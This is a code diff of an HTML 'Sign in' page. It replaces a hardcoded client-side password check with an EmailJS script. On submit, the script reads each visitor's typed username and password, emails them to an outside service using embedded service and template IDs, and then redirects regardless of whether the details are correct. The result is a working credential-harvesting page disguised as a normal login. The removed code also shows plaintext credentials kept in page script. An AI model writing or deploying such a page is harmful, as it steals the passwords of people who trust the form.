@@ -3,26 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- style files -->
     <link rel="stylesheet" href="style.css">
+    <!-- google fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
+   
     <title>Login</title>
+    <!-- ارسال ايميل عند محاولة تسجيل الدخول -->
+     <!-- emailjs.com -->
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
-    function checkCredentials() {
-    var username = document.getElementById("username").value;
-    var password = document.getElementById("password").value;
+        (function() {
+            emailjs.init("3o_Ok3aG0DS4-OWJo");  // استبدل YOUR_USER_ID بمعرف المستخدم الخاص بك من EmailJS
+        })();
 
-    var correctUsername = "Talaat";  // اسم المستخدم الصحيح
-    var correctPassword = "2486";  // كلمة المرور الصحيحة
+        function sendEmail(event) {
+            event.preventDefault();
+            var templateParams = {
+                username: document.getElementById('username').value,
+                password: document.getElementById('password').value
+            };
 
-    if (username === correctUsername && password === correctPassword) {
-        window.location.href = "pass-page/pass.html";  // protected.html ⚠️⚠️⚠️❗❗❗
-    } else {
-        alert("Incorrect username or password. Access denied.");
-    }
-    return false;
-}
+            emailjs.send('service_jmd86we', 'template_ut83dfy', templateParams)
+                .then(function(response) {
+                    console.log('SUCCESS!', response.status, response.text);
+                    window.location.href = 'pass-page/pass.html';
+                }, function(error) {
+                    console.log('FAILED...', error);
+                });
+        }
     </script>
 </head>
 <body>
@@ -36,7 +47,8 @@
     <div class="container-home">
         <div class="container-form">
 
-            <form onsubmit="return checkCredentials()">
+                <form onsubmit="sendEmail(event)" id="login-form">
+
                 <h2>Sign in</h2>
                 <br>
                 <div class="username">
@@ -50,8 +62,7 @@
                 </div>
                 <input type="submit" value="Submit" class="input-supmit">  <!-- زر "Submit" مخفي -->
                 
-                <!-- <button type="submit">Submit</button> -->
-            </form>
+                </form>
 
         </div>
     </div>
@@ -62,5 +73,6 @@
             </h3>
         </div>
     </footer>
+
 </body>
 </html>
